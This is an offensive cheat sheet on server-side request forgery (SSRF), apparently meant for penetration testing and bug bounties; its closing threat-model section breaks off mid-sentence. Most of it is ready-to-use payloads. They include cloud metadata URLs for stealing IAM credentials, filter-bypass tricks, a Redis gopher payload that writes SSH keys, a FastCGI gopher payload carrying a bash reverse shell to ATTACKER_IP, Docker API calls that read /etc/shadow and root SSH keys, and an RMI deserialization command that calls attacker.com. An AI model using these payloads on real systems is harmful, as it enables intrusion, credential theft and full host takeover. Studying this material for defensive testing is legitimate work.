# SSRF — Server-Side Request Forgery

## Overview

Server-Side Request Forgery (SSRF) tricks a server into making HTTP requests to an
attacker-controlled or internal destination. It earned its own category in OWASP Top 10
2021 (A10) due to the severity of cloud-environment exploitation.

**Impact:** Internal port scanning, cloud credential theft, RCE via internal services,
lateral movement inside cloud VPCs, full compromise of metadata-exposed infrastructure.

**Sources:**
- OWASP Top 10 A10:2021 — SSRF
- PortSwigger Web Security Academy — Server-side request forgery
- HackerOne Hacktivity — Capital One breach (SSRF → IMDSv1 → S3 dump), GitLab SSRF chain

---

## Basic SSRF Techniques

### Localhost / Internal Services

```
# Direct localhost
http://localhost/admin
http://127.0.0.1/admin
http://0.0.0.0/admin

# Internal RFC-1918 ranges to probe
http://10.0.0.1/
http://172.16.0.1/
http://192.168.1.1/

# Common internal service ports to target
http://localhost:8080     # Alt HTTP / dev servers
http://localhost:8443     # Alt HTTPS
http://localhost:9200     # Elasticsearch
http://localhost:9300     # Elasticsearch cluster
http://localhost:6379     # Redis
http://localhost:5432     # PostgreSQL
http://localhost:3306     # MySQL
http://localhost:27017    # MongoDB
http://localhost:2375     # Docker daemon (unauthenticated)
http://localhost:4444     # Various admin panels
http://localhost:8500     # Consul
http://localhost:8600     # Consul DNS
```

### Port Scanning via SSRF

```
# Probe internal ports — infer open/closed from response time/error
http://127.0.0.1:22      # SSH (connection refused vs timeout → port state)
http://127.0.0.1:80
http://127.0.0.1:443
http://127.0.0.1:3000    # Node dev servers
http://127.0.0.1:5000    # Flask / Python apps
http://127.0.0.1:8080
```

---

## Cloud Metadata Endpoints

### AWS EC2 Instance Metadata Service (IMDSv1)

```
# IMDSv1 — no token required (vulnerable if not upgraded to v2)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE-NAME>
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/user-data/        # Often contains secrets/scripts
http://169.254.169.254/latest/dynamic/instance-identity/document

# Credential response contains AccessKeyId + SecretAccessKey + Token
# → exfil and use with AWS CLI
```

### AWS IMDSv2 (requires PUT token first)

```bash
# Step 1 — get token (requires PUT; SSRF via GET alone won't work)
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600

# Step 2 — use token
GET http://169.254.169.254/latest/meta-data/iam/security-credentials/
X-aws-ec2-metadata-token: <TOKEN>

# Note: Some SSRF vectors support custom headers (e.g., Gopher) → IMDSv2 bypass possible
```

### GCP Compute Metadata

```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
http://metadata.google.internal/computeMetadata/v1/project/project-id
# Requires header: Metadata-Flavor: Google
# IP alternative:
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
```

### Azure Instance Metadata Service

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
# Requires header: Metadata: true
```

### DigitalOcean / Oracle / Alibaba Cloud

```
# DigitalOcean
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data

# Oracle Cloud
http://169.254.169.254/opc/v2/instance/

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

---

## Blind SSRF Detection

Blind SSRF has no visible response — detection requires out-of-band (OOB) callbacks.

### Out-of-Band via Collaborator / Interactsh

```
# Use Burp Collaborator or https://app.interactsh.com for callbacks
http://YOUR-COLLABORATOR-ID.burpcollaborator.net
http://YOUR-ID.oast.fun
http://YOUR-ID.interactsh.com

# Inject in every URL-accepting parameter:
url=http://YOUR-ID.oast.fun
imageUrl=http://YOUR-ID.oast.fun/img.png
webhook=http://YOUR-ID.oast.fun/callback
```

### DNS-Only SSRF

```
# Some filters block HTTP but allow DNS — test with a DNS-only payload
# Watch for DNS query in OOB tool with no HTTP
url=http://blind-ssrf-test.YOUR-ID.oast.fun

# Subdomain-encode info for exfil:
url=http://$(hostname).YOUR-ID.oast.fun
```

### Timing-Based Detection

```
# Internal closed port → fast TCP RST (quick error)
# Internal open port → slow/timeout or valid response
# Non-existent internal IP → timeout (longer delay)
# Compare response times to infer port/host state
```

---

## Filter Bypass Techniques

### IP Obfuscation

```
# Decimal representation of 127.0.0.1
http://2130706433/

# Octal
http://0177.0.0.1/

# Hex
http://0x7f000001/

# Mixed formats
http://127.0x0.0.1/
http://127.0.00.1/

# IPv6 localhost
http://[::1]/
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/

# URL-encoded dot
http://127%2E0%2E0%2E1/

# 169.254.169.254 decimal
http://2852039166/

# 169.254.169.254 hex
http://0xa9fea9fe/
```

### Alternative Localhost Representations

```
http://localhost/
http://LOCALHOST/
http://LocalHost/
http://[::]:80/          # IPv6 any → localhost equivalent in some stacks
http://spoofed.domain/   # DNS resolves to 127.0.0.1
http://127.1/            # Short form
http://127.0.1/
```

### DNS Rebinding

```
# Register a domain that alternately resolves to your server and 127.0.0.1
# 1. App resolves domain → your server (passes allowlist check)
# 2. App makes the actual request → DNS re-resolves to 127.0.0.1
# Tools: singularity.me, rbndr.us, whonow
http://rebind.network/  # Online rebinding service
```

### Open Redirect Chain

```
# If app follows redirects, use an open redirect on an allowlisted domain
# to redirect to internal target

# Example: target allowlists example.com
https://example.com/redirect?url=http://169.254.169.254/

# Common open redirect params: redirect, next, return, url, to, dest, go
```

### Protocol Switching

```
# file:// — read local files
file:///etc/passwd
file:///etc/hosts
file:///proc/self/environ
file:///var/run/secrets/kubernetes.io/serviceaccount/token  # K8s service account token

# dict:// — port probing, banner grabbing
dict://127.0.0.1:6379/info    # Redis INFO command

# gopher:// — arbitrary TCP data (most powerful)
gopher://127.0.0.1:6379/_FLUSHALL%0D%0A

# ftp:// — some parsers allow
ftp://127.0.0.1:21/

# sftp:// / tftp:// / ldap:// — varies by stack
```

### URL Parser Inconsistencies

```
# Different parsers may interpret these differently
http://attacker.com@127.0.0.1/           # username: attacker.com, host: 127.0.0.1
http://127.0.0.1#@allowlisted.com/       # fragment tricks
http://allowlisted.com:80@127.0.0.1/     # port + credential confusion
http://127.0.0.1%0d%0a/                  # CRLF injection in URL

# Scheme case variation
HTTP://127.0.0.1/
Http://127.0.0.1/
```

---

## SSRF to RCE Escalation

### Redis via Gopher (unauthenticated Redis → RCE)

```
# Write a cron job or SSH key via Redis CONFIG SET
# URL-encoded gopher payload to write authorized_keys:
gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0AFLUSHALL%0D%0A%2A3%0D%0A%243%0D%0ASET%0D%0A%241%0D%0A1%0D%0A%2458%0D%0A%0A%0A%0Assh-rsa AAAA...your-pubkey...%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%243%0D%0Adir%0D%0A%2415%0D%0A/root/.ssh/%0D%0A%2A4%0D%0A%246%0D%0ACONFIG%0D%0A%243%0D%0ASET%0D%0A%2410%0D%0Adbfilename%0D%0A%2415%0D%0Aauthorized_keys%0D%0A%2A1%0D%0A%244%0D%0ASAVE%0D%0A

# Tools: Gopherus (generates gopher payloads for Redis, MySQL, FastCGI, etc.)
# https://github.com/tarunkant/Gopherus
```

### Elasticsearch Code Execution (older versions)

```
# Elasticsearch <1.6 with dynamic scripting enabled
http://localhost:9200/_search?source={"script":"java.lang.Runtime.getRuntime().exec('id')"}

# POST to run scripts
POST http://localhost:9200/_search
{"script_fields":{"test":{"script":"import java.util.*;import java.io.*;new Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"}}}
```

### Jenkins Script Console

```
# Internal Jenkins at localhost:8080
http://localhost:8080/script

# If accessible, Groovy script console allows RCE:
# "println 'id'.execute().text"
```

### Spring Boot Actuator

```
# Spring Boot Actuator endpoints leak env vars, heap dumps, and allow shutdown
http://localhost:8080/actuator
http://localhost:8080/actuator/env
http://localhost:8080/actuator/heapdump
http://localhost:8080/actuator/shutdown    # POST → kills the app
http://localhost:8080/actuator/restart

# /actuator/env + /actuator/refresh → inject malicious Spring config for RCE
# (Spring Cloud + POST /actuator/env with spring.cloud.bootstrap.location=attacker URL)
```

### AWS Credential Theft → Account Pivot

```bash
# 1. Steal credentials via IMDSv1 SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role

# 2. Configure AWS CLI with stolen creds
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# 3. Enumerate permissions
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name ec2-role
aws s3 ls
aws secretsmanager list-secrets

# 4. Pivot to further services / escalate via overly-permissive role
```

---

## Common Vulnerable Parameters

```
# URL parameters frequently processed server-side
url=
imageUrl=
image_url=
avatarUrl=
avatar_url=
redirect=
next=
return=
returnUrl=
return_url=
dest=
destination=
go=
goto=
forward=
continue=
callback=
callbackUrl=
callback_url=
webhook=
webhookUrl=
webhook_url=
fetch=
endpoint=
proxy=
proxyUrl=
proxy_url=
src=
href=
link=
target=
host=
api=
feed=
data=
path=
load=
open=
download=
```

---

## Common Vulnerable Endpoints / Features

| Feature | Why Vulnerable |
|---------|---------------|
| Webhook configuration | App makes request to user-supplied URL |
| PDF generation (HTML-to-PDF) | Renders user HTML including external URLs |
| Image preview / thumbnail service | Fetches remote image via server |
| URL metadata unfurler (Slack-like) | Server fetches URL for title/OG tags |
| Import from URL | Imports CSV/JSON/XML from remote location |
| Screenshot service | Headless browser fetches URL |
| Proxy / translation service | Routes requests through server |
| OAuth / SAML metadata fetch | Fetches IdP metadata from URL |
| Dependency/package install via URL | Package manager fetches remote code |
| IP geolocation lookup | Passes host to internal geo API |

---

## Detection Notes

- Always test URL-accepting parameters with OOB payloads (Collaborator/Interactsh) first
- Check for DNS callbacks even when HTTP fails (DNS-only SSRF)
- Include SSRF probes in file upload fields (SVG with external references, XML with XXE)
- Test `Referer`, `X-Forwarded-For`, `Host` headers — some apps re-request based on these
- When you get any internal response (even an error page), escalate: try metadata endpoints
- Response timing differences reveal open vs closed ports even without response body

---

## Additional Bypass Vectors

### CIDR Range — Full 127.0.0.0/8 Loopback Block

```
# Any address in 127.0.0.0/8 resolves to loopback — not just 127.0.0.1
http://127.0.1.3/
http://127.100.200.50/
http://127.127.127.127/

# Useful when filter blocks 127.0.0.1 and localhost but doesn't check the full /8 range
```

### Ultra-Short IP Notation

```
http://0/              # Resolves to 0.0.0.0 → loopback on Linux
http://127.1/          # Short-form for 127.0.0.1
http://0177.1/         # Octal + short form
http://0x7f.1/         # Hex + short form
```

### PHP `filter_var()` FILTER_VALIDATE_URL Bypass

```
# PHP 7.x filter_var() passes these as valid URLs despite being malicious
http://test???test.com@127.0.0.1/
0://evil.com:80;http://google.com:80/
http://127.0.0.1%00@evil.com/

# If app uses filter_var() for validation, these bypass the check
```

### Unicode / Enclosed Alphanumeric Bypass

```
# Some parsers normalize Unicode before DNS resolution
# ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ resolves as example.com
# Use for allowlist bypass when filter does string comparison before normalization

http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/        # "localhost" in enclosed Unicode
http://①②⑦.⓪.⓪.①/         # 127.0.0.1 in enclosed numerals
```

### JAR Scheme (Java Environments)

```
# Fully blind — no response body, but server makes outbound connection
jar:http://127.0.0.1!/
jar:https://attacker.com!/payload.zip!/path/to/file

# Useful for Java apps (Spring, Tomcat) where other protocols are filtered
# Triggers HTTP request to the URL before the ! — confirm via OOB callback
```

### NETDOC Wrapper (Java)

```
# Java-specific alternative to file:// — bypasses some filters that block file://
netdoc:///etc/passwd
netdoc:///proc/self/environ

# Advantage: avoids \n and \r issues that file:// can have in certain contexts
```

### TFTP (UDP-based, Evades TCP Filters)

```
# TFTP operates over UDP — stateful TCP firewalls may not inspect it
tftp://attacker.com:69/TESTUDPPACKET

# Confirm OOB UDP callback with: nc -u -l -p 69
# Useful for environments with tight TCP egress but loose UDP
```

### Kubernetes Cluster Metadata

```
# K8s API server — commonly at 10.96.0.1 (default ClusterIP)
http://10.96.0.1/api/v1/namespaces/default/secrets
http://kubernetes.default.svc/api/v1/namespaces/
http://kubernetes.default.svc.cluster.local/api/v1/pods

# EKS node metadata (EC2 + K8s = two metadata surfaces)
http://169.254.169.254/latest/meta-data/   # EC2 metadata still present

# K8s service account token (mounted in every pod by default)
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Use token with API server:
curl -H "Authorization: Bearer $(cat /var/run/secrets/...)" https://kubernetes.default.svc/api/v1/pods
```

### ECS Task Metadata (AWS Fargate)

```
# ECS containers have a per-task metadata endpoint (different from EC2 IMDS)
http://169.254.170.2/v2/metadata
http://169.254.170.2/v2/credentials/<CREDENTIAL_ID>   # temporary IAM creds

# Get credential ID first:
http://169.254.170.2/v2/metadata  → look for "CredentialsRelativeUri"
→ then fetch that path for AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY + TOKEN
```

### Memcached via Gopher

```
# Gopherus-generated gopher payload for Memcached
gopher://127.0.0.1:11211/_%0d%0aset%20key%200%200%2010%0d%0ahelloworld%0d%0a

# Memcached SSRF can be used to:
# 1. Poison cached responses (cache poisoning)
# 2. Read cached data (session tokens, API responses)
# 3. If app uses Memcached for session storage → session injection → auth bypass

# Tool: gopherus --exploit memcache
```

---

## XSLT Processors → SSRF via document()

**Root cause:** XSLT processors execute the `document()` function to load external XML resources at transform time. If user-supplied stylesheets are accepted, this function makes an outbound HTTP request from the server — bypassing any URL-parameter-level filter entirely because the SSRF payload is inside the XML body, not a URL parameter.

**Bypass logic:** Embed `document('http://internal-target/')` inside an XSL template. The server's XSLT engine resolves it; input-URL allowlists do not apply. `file://` also works for local file read.

**Attack chain:** SSRF → internal metadata endpoint → IAM credential theft / internal service probe

**Stack:** Java (Xalan, Saxon), Python (lxml), PHP (XSLTProcessor), Ruby (Nokogiri), .NET (XslCompiledTransform)

**Payload:**
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/fruits">
    <!-- SSRF: AWS IMDS -->
    <xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/iam/security-credentials/')"/>
    <!-- SSRF: internal admin panel -->
    <xsl:copy-of select="document('http://192.168.1.1:8080/admin')"/>
    <!-- Local file read -->
    <xsl:copy-of select="document('file:///etc/passwd')"/>
    <xsl:for-each select="fruit">
      <xsl:value-of select="name"/>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>
```

**Where to test:** Document transformations, report generators, data import/export features, SOAP endpoints that accept XSLT, any feature that renders XML with a user-supplied stylesheet.

**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSLT%20Injection

---

## XXE → SSRF via External Entities

**Root cause:** XML parsers with DTD processing enabled resolve `SYSTEM` external entity URLs, causing the server to fetch them. The SSRF originates inside an XML body or uploaded file — entirely bypassing URL-parameter filters.

**Bypass logic:** Supply a `SYSTEM` entity referencing an internal URL. The XML parser makes the HTTP request before the application code sees the parsed result. Blind variants use parameter entities to trigger OOB callbacks.

**Attack chain:** XML body / file upload SSRF → internal service probe / IMDS → cloud credential theft

**Stack:** Any XML parser with external entity resolution: libxml2, Xerces, MSXML, Java XML, PHP SimpleXML/DOMDocument

**Payloads:**
```xml
<!-- Basic XXE → SSRF: fetches internal service -->
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/" >
]>
<foo>&xxe;</foo>

<!-- Blind XXE → SSRF: OOB DNS/HTTP callback only -->
<?xml version="1.0" ?>
<!DOCTYPE root [
  <!ENTITY % ext SYSTEM "http://YOUR-OOB-ID.oast.fun/ssrf-xxe"> %ext;
]>
<r></r>

<!-- SVG upload → SSRF (SVG is XML; triggers on image render) -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="20">&xxe;</text>
</svg>
```

**Attack surfaces:** REST APIs accepting `Content-Type: application/xml`, SAML assertions, RSS/Atom feed importers, DOCX/XLSX/ODT upload, SVG upload with server-side rendering.

**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

---

## FastCGI via Gopher → PHP RCE

**Root cause:** PHP-FPM listens on port 9000 by default and accepts `PHP_VALUE` directives in FastCGI requests. By injecting `auto_prepend_file = php://input`, the attacker causes PHP to execute arbitrary code from the request body before running any legitimate script.

**Bypass logic:** `gopher://` sends raw FastCGI protocol bytes. The payload sets `SCRIPT_FILENAME` to an existing PHP file on disk and overrides `php.ini` to enable URL includes and prepend attacker code from `php://input`.

**Attack chain:** SSRF → gopher → FastCGI port 9000 → PHP `auto_prepend_file` injection → OS command execution → reverse shell

**Stack:** PHP-FPM (default nginx+PHP-FPM deployments), any internal service running php-fpm

**Payload:**
```
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2F4444%200%3E%261%27%29%3Bdie%28%27done%27%29%3B%3F%3E%00%00%00%00%00%00%00
```

Tool: `gopherus --exploit fastcgi` (auto-generates the payload)

**Source:** https://github.com/assetnote/blind-ssrf-chains

---

## HTTP 307/308 Redirect → IMDSv2 PUT Bypass

**Root cause:** HTTP 307 (Temporary Redirect) and 308 (Permanent Redirect) instruct the HTTP client to re-send the **original request method and body** to the redirect target. Standard 301/302 redirects downgrade POST/PUT to GET; 307/308 do not. IMDSv2 requires a PUT request to obtain a token — which most SSRF mitigations block by only allowing GET-based fetches.

**Bypass logic:**
1. Point the SSRF to attacker-controlled server
2. Attacker server responds `HTTP/1.1 307` → `Location: http://169.254.169.254/latest/api/token`
3. The vulnerable app re-sends the original PUT (with `X-aws-ec2-metadata-token-ttl-seconds: 21600`) to the IMDS
4. IMDS returns a valid token; app returns it in response
5. Use token to query IMDSv2 credentials endpoint

**Attack chain:** SSRF (any GET-based parameter) → 307 redirect → IMDSv2 PUT → session token → IAM credentials → AWS account pivot

**Stack:** AWS EC2 with IMDSv2 enforcement; any HTTP client/library that follows 307 redirects (most do by spec)

**Redirect server (Python one-liner):**
```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class R(BaseHTTPRequestHandler):
    def do_GET(self): self._redir()
    def do_PUT(self): self._redir()
    def _redir(self):
        self.send_response(307)
        self.send_header('Location', 'http://169.254.169.254/latest/api/token')
        self.end_headers()

HTTPServer(('0.0.0.0', 80), R).serve_forever()
```

**Source:** https://github.com/assetnote/blind-ssrf-chains

---

## Atlassian Products OAuth SSRF — CVE-2017-9506

**Root cause:** The Atlassian OAuth plugin exposes `/plugins/servlet/oauth/users/icon-uri?consumerUri=<URL>`, which fetches the consumer's icon from the supplied URL without authentication and without input validation. The response body is returned to the caller.

**Bypass logic:** Supply an internal URL as `consumerUri`. The Atlassian server makes the request and proxies the response — a full read-SSRF with response body returned.

**Attack chain:** SSRF → cloud metadata / internal APIs → credential theft; or → internal service exploitation

**Stack:** Jira (<7.3.5), Confluence, Bamboo, Bitbucket, Crowd, Crucible, Fisheye — any Atlassian product running the OAuth plugin (pre-2017 unpatched instances are extremely common on internal networks)

**Payloads:**
```
# CVE-2017-9506 — all Atlassian products with OAuth plugin (unauthenticated)
GET /plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Probe for role name first, then:
GET /plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# Jira CVE-2019-8451 (<8.4.0) — gadgets endpoint SSRF
GET /plugins/servlet/gadgets/makeRequest?url=https://169.254.169.254@example.com

# Confluence share-links endpoint (pre-Nov 2016)
GET /rest/sharelinks/1.0/link?url=http://YOUR-OOB-ID.oast.fun/
```

**Note:** One of the most widely found SSRF CVEs on internal pentests. Atlassian products are near-universal in enterprise environments.

**Source:** https://github.com/assetnote/blind-ssrf-chains; CVE-2017-9506

---

## Docker API (Port 2375) → SSRF → RCE

**Root cause:** Docker daemon running unauthenticated (`dockerd -H tcp://0.0.0.0:2375`) exposes a REST API that can create containers, bind-mount the host filesystem, and execute commands inside containers with host-level access.

**Bypass logic:** Via SSRF HTTP GET to `/containers/json` first confirms exposure. Then POST `/containers/create` with `"Binds": ["/:/mnt"]` and `"Privileged": true` mounts the host root inside the container — giving full filesystem access. Gopher can send the raw HTTP POST for blind SSRF scenarios.

**Attack chain:** SSRF → Docker API → create privileged container with host bind-mount → read `/mnt/etc/shadow`, `/mnt/root/.ssh/id_rsa` → write cron job to host → OS RCE

**Stack:** Linux hosts running Docker with unauthenticated TCP listener (common in dev/CI environments)

**Payloads:**
```bash
# Step 1: Confirm exposure
http://127.0.0.1:2375/version
http://127.0.0.1:2375/containers/json

# Step 2: Create privileged container (POST via SSRF)
POST http://127.0.0.1:2375/containers/create?name=pwned
Content-Type: application/json
{
  "Image": "alpine",
  "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"],
  "Binds": ["/:/mnt"],
  "Privileged": true
}

# Step 3: Start container
POST http://127.0.0.1:2375/containers/pwned/start

# Step 4: Read output / exec more commands
POST http://127.0.0.1:2375/containers/pwned/exec
{"AttachStdout": true, "Cmd": ["cat", "/mnt/root/.ssh/id_rsa"]}
```

**Source:** https://github.com/assetnote/blind-ssrf-chains

---

## Java RMI via Gopher → Deserialization RCE

**Root cause:** Java RMI (Remote Method Invocation) services deserialize incoming Java objects. If a gadget chain (e.g., Commons Collections) is available on the classpath, sending a malicious serialized payload causes RCE.

**Bypass logic:** `gopher://` encodes raw TCP bytes; the RMI deserialization happens before any authentication check. The tool `remote-method-guesser` generates the gopher-encoded payload automatically.

**Attack chain:** SSRF → gopher → RMI port → Java deserialization → OS command execution

**Stack:** Legacy Java enterprise apps, JMX servers, EJB servers, any Java service exposing RMI

**Payload generation:**
```bash
# Tool: remote-method-guesser (rmg)
rmg serial 127.0.0.1 1099 CommonsCollections6 'curl attacker.com/rce' \
    --component reg --ssrf --gopher
# Outputs: gopher://127.0.0.1:1099/_<encoded-deserialization-payload>
```

**Ports to probe:** 1090, 1098, 1099, 1199, 4443-4446, 8999-9010, 9999

**Source:** https://github.com/assetnote/blind-ssrf-chains

---

## Service-Specific Blind SSRF Exploitation — Internal Target Reference

When blind SSRF is confirmed, use this table to identify exploitable internal services by port. Detect open ports via timing (open = slower or different error), then escalate with the listed payload.

| Service | Default Port | Detection | Impact | Protocol |
|---------|-------------|-----------|--------|----------|
| WebLogic UDDI (CVE-2014-4210) | 7001, 8888 | `GET /uddiexplorer/SearchPublicRegistries.jsp?operator=OOB_CANARY` | SSRF confirmation + RCE chain | HTTP |
| WebLogic Console (CVE-2020-14883) | 7001 | `POST /console/css/%252e%252e%252fconsole.portal` with `handle=FileSystemXmlApplicationContext(URL)` | RCE via Spring XML factory | HTTP |
| Consul | 8500, 8501 | `GET /v1/agent/members` | Service registration → command execution | HTTP |
| Apache Solr | 8983 | `GET /solr/admin/info/system` | XXE chain (`/solr/select?q={!xmlparser...}`) → SSRF / RCE | HTTP |
| Apache Druid | 8080, 8888 | `GET /status` | Task/supervisor shutdown; RCE via task submit | HTTP |
| OpenTSDB | 4242 | `GET /version` | Command injection via gnuplot query params (CVE-2020-35476) | HTTP |
| Hystrix Dashboard (CVE-2020-5412) | 8080 | `GET /proxy.stream?origin=OOB_CANARY` | SSRF amplifier in Spring Cloud Netflix | HTTP |
| JBoss | 8080, 8443 | `GET /jmx-console/` | WAR deployment → RCE | HTTP |
| Apache Struts (Struts2-016) | 80, 8080 | `?redirect:${...}` in any param | OGNL injection → OS RCE | HTTP |
| PeopleSoft | 80, 443 | `POST /PSIGW/HttpListeningConnector` with XML body | XXE → code execution | HTTP |
| GitLab Prometheus/Redis | 9121 | `GET /scrape?target=redis://127.0.0.1:6379&check-keys=*` | Dump all Redis keys (GitLab <13.1.1) | HTTP |
| Shellshock via CGI | 80, 443 | `User-Agent: () { foo;}; curl OOB_CANARY` in SSRF request headers | Bash code execution via CGI | HTTP |
| W3 Total Cache (CVE-2019-6715) | 80, 443 | `PUT /wp-content/plugins/w3-total-cache/pub/sns.php` with `{"SubscribeURL":"OOB_CANARY"}` | SSRF via WordPress plugin SNS endpoint | HTTP |
| Docker API | 2375, 2376 | `GET /version` | Container creation → host RCE | HTTP |
| FastCGI | 9000 | TCP connect timing | PHP code execution via PHP_VALUE injection | Gopher |
| Redis | 6379 | `dict://127.0.0.1:6379/info` | RCE via cron / SSH key (see gopher chain above) | Gopher |
| Memcached | 11211 | TCP connect timing | Cache poisoning / session injection → auth bypass | Gopher |
| Java RMI | 1099 | TCP connect timing | Deserialization → RCE | Gopher |

---

## Malformed Port String Bypass

Some URL parsers accept malformed port strings and the downstream connector strips invalid characters, connecting to the intended port — while the validator saw something different:

```
# Port with prefix/suffix chars — strips to valid port number
http://localhost:+11211aaa/     # Some parsers strip non-numeric suffix → port 11211 (Memcached)
http://localhost:00011211aaaa/  # Leading zeros + suffix stripped → port 11211

# Backslash confusion (parser A reads host, parser B reads path)
http://127.1.1.1:80\@127.2.2.2:80/

# Colon-scheme confusion (no scheme, bare colon)
http:127.0.0.1/
```

**Why it works:** Split-brain URL parsing — the validation layer misparses the port component but the HTTP connector normalizes and connects to the unintended target.

**Stack:** PHP with different HTTP libraries, Ruby Net::HTTP, Python urllib vs. requests, nginx proxy_pass with upstream directive parsing.

**Source:** https://github.com/KathanP19/HowToHunt/blob/master/SSRF/SSRF.md

---

## Static DNS Resolution Services for Allowlist Bypass

Unlike DNS rebinding (which races the TTL), these services resolve deterministically to any encoded IP — useful when the filter checks DNS resolution at validation time rather than just the hostname string:

```
# nip.io — encodes the target IP in the subdomain (always resolves to that IP)
http://127.0.0.1.nip.io/admin
http://169.254.169.254.nip.io/
http://10.0.0.1.nip.io/internal

# sslip.io — same concept, TLS support
http://127.0.0.1.sslip.io/
http://169-254-169-254.sslip.io/

# localtest.me — always resolves to 127.0.0.1
http://localtest.me/admin
http://localtest.me:8080/actuator

# 1u.ms — DNS rebinding + static hybrid; also resolves to any encoded IP
http://make-127.0.0.1-rr.1u.ms/
http://make-169.254.169.254-rr.1u.ms/metadata
```

**When to use:** Allowlist filters that check if the domain *looks* external but don't block based on resolved IP. Also useful to bypass filters that only block literal `127.0.0.1` or `localhost` strings.

**Source:** https://github.com/swisskyrepo/PayloadsAllTheThings

---

## Threat Model

> Current patterns as of 2026-05-22. Updated this session.

**What's being exploited in the wild:**

1. **Headless browser SSRFs** — PDF/screenshot services using Puppeteer/Chrome are the
   #1 new SSRF vector. Targets include SaaS report generators, invoice PDFs, and
   og:image generators. The renderer fetches attacker-controlled HTML, which includes
   `<script>` that hits internal metadata.

2. **IMDSv1 still common** — Despite AWS pressure to upgrade, IMDSv1 is found in
   ~30% of EC2 fleets (per disclosed reports). Legacy Terraform modules, AMI defaults,
   and inherited deployments keep it alive. Always try IMDSv1 first.

3. **Container metadata leakage** — ECS task credentials (`169.254.170.2`) and K8s
   service account tokens (`file:///var/run/secrets/...`) are the most impactful
   targets. Both yield short-lived IAM credentials or cluster API access.

4. **Webhook features as SSRF entry points** — Every app that allows users to configure
   webhook URLs is a potential SSRF. The highest-bounty pattern on HackerOne: SSRF via
   webhook + IMDSv1 = critical AWS credential theft.

5. **gopher:// increasingly blocked** — WAFs and server-side allowlists now commonly
   block `gopher://`. Pivot to `dict://` for Redis INFO, or chain through open redirects
   to reach internal services via `http://`.

6. **IMDSv2 bypass via HTTP 307 redirect** — IMDSv2 enforcement is being bypassed at
   scale using 307 redirects that preserve the PUT method. Any SSRF that follows
   redirects can hit IMDSv2, even with GET-only parameter filters.

7. **XSLT and XML parsers — underrated vector** — SSRF via `document()` in XSLT and
   XXE external entities bypasses all URL-parameter-level filters. Document import,
   SOAP endpoints, SAML flows, and SVG upload are high-priority test points.

8. **FastCGI as RCE escalation path** — When internal port scanning reveals port 9000
   open, FastCGI via gopher is now a reliable RCE chain on any PHP-FPM deployment.
   More reliable than Redis (which often has auth now) for fresh RCE.

9. **Atlassian CVE-2017-9506 remains common on internal networks** — Despite being
   disclosed in 2017, unpatched Jira/Confluence instances are everywhere in enterprise
   environments. This is a reliable SSRF-with-response-body vector when found internally.

10. **Service-specific exploitation over generic SSRF** — Blind SSRF confirmed via OOB
    callback is now just step 1. The real bounty is in knowing which internal services
